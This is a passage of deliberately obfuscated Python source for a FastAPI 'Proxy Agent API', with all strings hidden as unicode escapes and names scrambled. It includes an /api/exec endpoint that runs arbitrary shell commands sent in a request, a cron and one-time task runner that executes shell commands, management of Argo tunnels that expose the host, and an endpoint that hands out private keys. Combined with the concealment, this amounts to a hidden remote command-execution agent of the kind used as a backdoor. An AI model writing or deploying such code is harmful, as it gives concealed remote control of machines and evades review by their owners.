        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0066\\u0069\\u006c\\u0065\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.file_manager))
        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.task_manager))
    yield
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\U0001f6d1\\u0020\\u5e94\\u7528\\u5173\\u95ed\\uff0c\\u6e05\\u7406\\u8d44\\u6e90\\u002e\\u002e\\u002e', 'unicode_escape'))
    if hasattr(app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.task_manager.stop_cron_loop()
        except:
            pass
    if hasattr(app.state, codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u005f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.argo_tunnel_manager.stop_all()
        except Exception:
            pass
app = FastAPI(title=codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u0041\\u0050\\u0049', 'unicode_escape'), description=codecs.decode('\\u5355\\u6587\\u4ef6\\u90e8\\u7f72\\u7248\\u0020\\u002d\\u0020\\u652f\\u6301\\u7b7e\\u540d\\u8ba4\\u8bc1\\u4e0e\\u54cd\\u5e94\\u52a0\\u5bc6', 'unicode_escape'), version=Config.AGENT_VERSION, docs_url=codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073', 'unicode_escape') if Config.DEBUG else None, redoc_url=None, lifespan=O0_fn_24)
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(CORSMiddleware, allow_origins=[codecs.decode('\\u002a', 'unicode_escape')], allow_methods=[codecs.decode('\\u002a', 'unicode_escape')], allow_headers=[codecs.decode('\\u002a', 'unicode_escape')], expose_headers=[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')])
app.add_middleware(AuthEncryptMiddleware)

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelListResponse)
async def O0_fn_25(request: Request):
    O0_var_822 = request.app.state.argo_tunnel_manager
    O0_var_823 = O0_var_822.list_tunnels()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_823), codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_823}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelCreateResponse, response_model_exclude_none=True)
async def O0_fn_26(request: Request, payload: ArgoTunnelCreateRequest=Body(...)):
    O0_var_824 = request.app.state.argo_tunnel_manager
    O0_var_825 = payload.port if payload.port is not None else Config.PORT
    try:
        return O0_var_824.create_tunnel(O0_var_825, duplicate=payload.duplicate)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_825, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelDeleteResponse, response_model_exclude_none=True)
async def O0_fn_27(request: Request, payload: ArgoTunnelDeleteRequest=Body(...)):
    O0_var_826 = request.app.state.argo_tunnel_manager
    try:
        return O0_var_826.delete_tunnel(payload.port, tunnel_domain=payload.tunnel_domain)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): payload.port, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

async def O0_fn_28(request: Request) -> ExecRequestJSON:
    O0_var_827 = await request.body()
    O0_var_828 = O0_var_827.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')).strip()
    if not O0_var_828:
        raise HTTPException(status_code=400, detail=codecs.decode('\\u0045\\u006d\\u0070\\u0074\\u0079\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'))
    try:
        return ExecRequestJSON.model_validate_json(O0_var_828)
    except Exception:
        return ExecRequestJSON(cmd=O0_var_828)

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), response_model=BaseInfoResponse)
async def O0_fn_29(request: Request):
    O0_var_829 = time.time()
    if Config._baseinfo_lock is None:
        Config._baseinfo_lock = asyncio.Lock()
    async with Config._baseinfo_lock:
        if Config._baseinfo_cache is None or O0_var_829 - Config._baseinfo_cache_time > Config.BASEINFO_CACHE_TTL:
            Config._baseinfo_cache = await SystemInfoCollector().get_basic_info()
            Config._baseinfo_cache_time = O0_var_829
            Logger.debug(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u7f13\\u5b58\\u5df2\\u8fc7\\u671f\\uff0c\\u5df2\\u91cd\\u65b0\\u8c03\\u5ea6\\u7cfb\\u7edf\\u8d44\\u6e90\\u8fdb\\u884c\\u66f4\\u65b0\\u3002', 'unicode_escape'))
        else:
            Logger.debug(codecs.decode('\\U0001f4e6\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u547d\\u4e2d\\u6709\\u6548\\u7f13\\u5b58\\uff0c\\u76f4\\u63a5\\u8f93\\u51fa\\u3002', 'unicode_escape'))
        O0_var_830 = Config._baseinfo_cache.copy()
    if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
        O0_var_830[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.SESSION_KEY
        O0_var_830[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.NOISE_KEY
    else:
        O0_var_830[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
        O0_var_830[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
    if Config.KMODE == codecs.decode('\\u0031', 'unicode_escape'):
        KModeController.on_baseinfo_success()
    return O0_var_830

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=StatusResponse)
async def O0_fn_30(request: Request):
    O0_var_831 = time.time()
    if Config._status_lock is None:
        Config._status_lock = asyncio.Lock()
    async with Config._status_lock:
        if Config._status_cache is None or O0_var_831 - Config._status_cache_time > Config.STATUS_CACHE_TTL:
            Config._status_cache = await SystemInfoCollector().get_realtime_info()
            Config._status_cache_time = O0_var_831
            Logger.debug(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u5b9e\\u65f6\\u76d1\\u63a7\\u7f13\\u5b58\\u5df2\\u8fc7\\u671f\\uff0c\\u5df2\\u91cd\\u65b0\\u751f\\u6210\\u5ea6\\u91cf\\u5feb\\u7167\\u3002', 'unicode_escape'))
        else:
            Logger.debug(codecs.decode('\\U0001f4e6\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u547d\\u4e2d\\u76d1\\u63a7\\u7f13\\u5b58\\u3002', 'unicode_escape'))
        O0_var_832 = Config._status_cache.copy()
    return O0_var_832

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0065\\u0078\\u0065\\u0063', 'unicode_escape'), response_model=ExecResponse)
async def O0_fn_31(payload: ExecRequestJSON=Depends(O0_fn_28)):
    O0_var_833 = payload.cmd
    O0_var_834 = payload.cwd
    O0_var_835 = payload.env
    O0_var_836 = Config.Rtimeout
    O0_var_837 = Config.EXEC_SHELL_MODE
    O0_var_838 = {codecs.decode('\\u0073\\u0068\\u0065\\u006c\\u006c', 'unicode_escape'): O0_var_837, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): subprocess.PIPE, codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): subprocess.STDOUT, codecs.decode('\\u0073\\u0074\\u0064\\u0069\\u006e', 'unicode_escape'): subprocess.DEVNULL, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): O0_var_836, codecs.decode('\\u0074\\u0065\\u0078\\u0074', 'unicode_escape'): True, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0077\\u0064', 'unicode_escape'): O0_var_834}
    if O0_var_835:
        O0_var_838[codecs.decode('\\u0065\\u006e\\u0076', 'unicode_escape')] = {**os.environ, **O0_var_835}
    try:
        O0_var_839 = subprocess.run(O0_var_833, **O0_var_838)
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_839.stdout, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_839.returncode, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_833}
    except subprocess.TimeoutExpired as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u000a', 'unicode_escape') + str(e.output or ''), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 124, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): True, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_833}
    except Exception as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(e)), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): -1, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_833}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0065\\u006d\\u0070\\u006b\\u0065\\u0079', 'unicode_escape'), response_model=TempKeyResponse)
async def O0_fn_32(request: Request, ttl: int=Query(Config.TEMPKEY_DEFAULT_TTL_HOURS, ge=1, le=Config.TEMPKEY_MAX_TTL_HOURS)):
    O0_var_840 = request.app.state.temp_key_manager
    O0_var_841 = O0_var_840.get_or_create(ttl)
    return TempKeyResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), key_id=O0_var_841[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')], ttl_seconds=O0_var_841[codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape')], created_at=datetime.utcfromtimestamp(O0_var_841[codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), expires_at=datetime.utcfromtimestamp(O0_var_841[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), ecdsa=TempKeyEcdsaPair(private_key=O0_var_841[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip(), public_key=O0_var_841[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip()), ecies=TempKeyEciesPair(private_key=O0_var_841[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')], public_key=O0_var_841[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')]))

class TaskManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4efb\\u52a1\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u7eaf\\u5185\\u5b58\\u5b58\\u50a8\\uff0c\\u52a8\\u6001\\u6267\\u884c\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u542f\\u52a8\\u4efb\\u52a1\\u003a\\u0020\\u4e00\\u6b21\\u6027\\u6267\\u884c\\uff0c\\u6267\\u884c\\u540e\\u81ea\\u52a8\\u6e05\\u9664\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u5b9a\\u65f6\\u4efb\\u52a1\\u003a\\u0020\\u0043\\u0072\\u006f\\u006e\\u0074\\u0061\\u0062\\u0020\\u8868\\u8fbe\\u5f0f\\u8c03\\u5ea6\\uff0c\\u540e\\u53f0\\u5faa\\u73af\\u68c0\\u67e5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, timeout: int=300, check_interval: int=30, O0_var_842: int=None):
        self.timeout = timeout
        self.check_interval = check_interval
        self.max_log_size = O0_var_842 or Config.MAX_TASK_LOG_SIZE
        Config.onetimetasks_log = deque(Config.onetimetasks_log, maxlen=self.max_log_size)
        Config.crontasks_log = deque(Config.crontasks_log, maxlen=self.max_log_size)
        self._cron_task: Optional[asyncio.Task] = None
        self._running = False
        self._executed_crons: set = set()

    def set_onetime_tasks(self, O0_var_843: List[str]) -> dict:
        Config.onetasks = O0_var_843 if O0_var_843 else []
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}

    def get_onetime_tasks(self) -> dict:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}

    def run_onetime_tasks(self) -> List[dict]:
        if not Config.InitTask or not Config.onetasks:
            return []
        O0_var_844 = []
        O0_var_845 = Config.onetasks.copy()
        for O0_var_846, O0_var_847 in enumerate(O0_var_845):
            O0_var_848 = datetime.utcnow()
            try:
                if Config.DEBUG:
                    Logger.debug(codecs.decode('\\U0001f680\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u002d', 'unicode_escape') + str(O0_var_846 + 1) + codecs.decode('\\u005d\\u0020\\u0045\\u0078\\u0065\\u0063\\u0075\\u0074\\u0069\\u006e\\u0067\\u003a\\u0020', 'unicode_escape') + str(O0_var_847[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                O0_var_849 = subprocess.run(O0_var_847, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, timeout=self.timeout, text=True, errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                O0_var_850 = O0_var_849.stdout[:2000]
                O0_var_851 = O0_var_849.returncode
                O0_var_852 = self._format_log_entry(O0_var_847, O0_var_850, O0_var_851, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_852, self.max_log_size)
                O0_var_844.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_846, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_847[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_851, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_850[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
            except subprocess.TimeoutExpired as e:
                O0_var_850 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u0020', 'unicode_escape') + str(e.output[:500] if e.output else '')
                O0_var_851 = 124
                O0_var_852 = self._format_log_entry(O0_var_847, O0_var_850, O0_var_851, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_852, self.max_log_size)
                O0_var_844.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_846, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_847[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_851, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_850[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape')})
            except Exception as e:
                O0_var_850 = codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_851 = -1
                O0_var_852 = self._format_log_entry(O0_var_847, O0_var_850, O0_var_851, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_852, self.max_log_size)
                O0_var_844.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_846, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_847[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_851, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_850, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')})
        Config.InitTask = False
        if Config.DEBUG:
            Logger.debug(codecs.decode('\\u2705\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u005d\\u0020\\u0043\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064\\u0020', 'unicode_escape') + str(len(O0_var_844)) + codecs.decode('\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u002c\\u0020\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073\\u005f\\u006c\\u006f\\u0067', 'unicode_escape'))
        return O0_var_844

    async def _check_and_run_cron(self):
        if not Config.crontasks:
            return
        O0_var_853 = datetime.now()
        for O0_var_854, O0_var_855 in Config.crontasks.items():
            try:
                O0_var_856 = croniter(O0_var_854, O0_var_853)
                O0_var_857 = O0_var_856.get_prev(datetime)
                O0_var_858 = (O0_var_853 - O0_var_857).total_seconds()
                if 0 <= O0_var_858 <= self.check_interval + 5:
                    O0_var_859 = O0_var_857.strftime(codecs.decode('\\u0025\\u0059\\u0025\\u006d\\u0025\\u0064\\u0025\\u0048\\u0025\\u004d', 'unicode_escape'))
                    O0_var_860 = str(O0_var_854) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_855) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_859)
                    O0_var_861 = hashlib.md5(O0_var_860.encode()).hexdigest()[:10]
                    if O0_var_861 in self._executed_crons:
                        continue
                    if Config.DEBUG:
                        Logger.info(codecs.decode('\\u23f0\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0054\\u0072\\u0069\\u0067\\u0067\\u0065\\u0072\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(O0_var_854) + codecs.decode('\\u0020\\u2192\\u0020', 'unicode_escape') + str(O0_var_855[:50]) + codecs.decode('\\u002e\\u002e\\u002e\\u0020\\u0028\\u004c\\u0061\\u0067\\u003a\\u0020', 'unicode_escape') + format(O0_var_858, codecs.decode('\\u002e\\u0032\\u0066', 'unicode_escape')) + codecs.decode('\\u0073\\u0029', 'unicode_escape'))
                    O0_var_862 = await asyncio.create_subprocess_shell(O0_var_855, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, stdin=asyncio.subprocess.DEVNULL)
                    try:
                        O0_var_863, O0_var_864 = await asyncio.wait_for(O0_var_862.communicate(), timeout=self.timeout)
                        O0_var_865 = O0_var_863.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))[:2000]
                        O0_var_866 = O0_var_862.returncode
                    except asyncio.TimeoutError:
                        try:
                            O0_var_862.kill()
                        except:
                            pass
                        O0_var_865 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d', 'unicode_escape')
                        O0_var_866 = 124
                    except Exception as inner_e:
                        O0_var_865 = codecs.decode('\\u005b\\u0052\\u0055\\u004e\\u0054\\u0049\\u004d\\u0045\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(inner_e))
                        O0_var_866 = -1
                    O0_var_867 = self._format_log_entry(O0_var_855, O0_var_865, O0_var_866, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_854)
                    Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_867, self.max_log_size)
                    self._executed_crons.add(O0_var_861)
                    asyncio.get_event_loop().call_later(120, self._executed_crons.discard, O0_var_861)
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0053\\u0063\\u0068\\u0065\\u0064\\u0075\\u006c\\u0065\\u0072\\u0020\\u0045\\u0072\\u0072\\u006f\\u0072\\u0020\\u0066\\u006f\\u0072\\u0020\\u0027', 'unicode_escape') + str(O0_var_854) + codecs.decode('\\u0027\\u003a\\u0020', 'unicode_escape') + str(e))
                O0_var_865 = codecs.decode('\\u005b\\u0053\\u0043\\u0048\\u0045\\u0044\\u0055\\u004c\\u0045\\u0052\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_867 = self._format_log_entry(O0_var_855, O0_var_865, -1, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_854)
                Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_867, self.max_log_size)

    def get_onetime_log(self, O0_var_868: int=None) -> list:
        O0_var_869 = list(Config.onetimetasks_log)
        if O0_var_868 and O0_var_868 > 0:
            return O0_var_869[-O0_var_868:]
        return O0_var_869

    def get_cron_log(self, O0_var_870: int=None) -> list:
        O0_var_871 = list(Config.crontasks_log)
        if O0_var_870 and O0_var_870 > 0:
            return O0_var_871[-O0_var_870:]
        return O0_var_871

    def clear_logs(self, O0_var_872: str=codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')):
        if O0_var_872 in [codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.onetimetasks_log.clear()
        if O0_var_872 in [codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.crontasks_log.clear()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006c\\u0065\\u0061\\u0072\\u0065\\u0064', 'unicode_escape'): O0_var_872}

    def set_cron_tasks(self, O0_var_873: Dict[str, str]) -> dict:
        O0_var_874 = []
        for O0_var_875 in O0_var_873.keys():
            try:
                croniter(O0_var_875, datetime.now())
            except Exception:
                O0_var_874.append(O0_var_875)
        if O0_var_874:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u0072\\u006f\\u006e\\u0020\\u0065\\u0078\\u0070\\u0072\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_874), codecs.decode('\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_873) - len(O0_var_874)}
        Config.crontasks = O0_var_873 if O0_var_873 else {}
        if Config.crontasks and (not Config.cronloop):
            self.start_cron_loop()
        elif not Config.crontasks and Config.cronloop:
            self.stop_cron_loop()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}

    def get_cron_tasks(self) -> dict:
